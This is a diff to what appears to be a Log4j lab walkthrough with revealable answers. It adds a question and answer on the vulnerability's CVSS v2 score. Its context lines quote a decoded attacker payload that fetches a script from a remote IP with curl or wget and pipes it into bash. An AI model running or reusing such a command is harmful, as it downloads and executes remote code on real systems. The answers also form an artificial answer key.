@@ -1016,3 +1016,12 @@ The Base64 encoded string is part of the url in question 5 `KGN1cmwgLXMgNDUuMTU1
 > (curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash {.answer .blur} 
 
 [Reveal Answer](#) {.reveal-answer .btn .btn-primary}
+
+#### Question 8
+
+What is the CVSS v2 score of the Log4j vulnerability?
+
+#### Answer
+> 9.3
+
+[Reveal Answer](#) {.reveal-answer .btn .btn-primary}
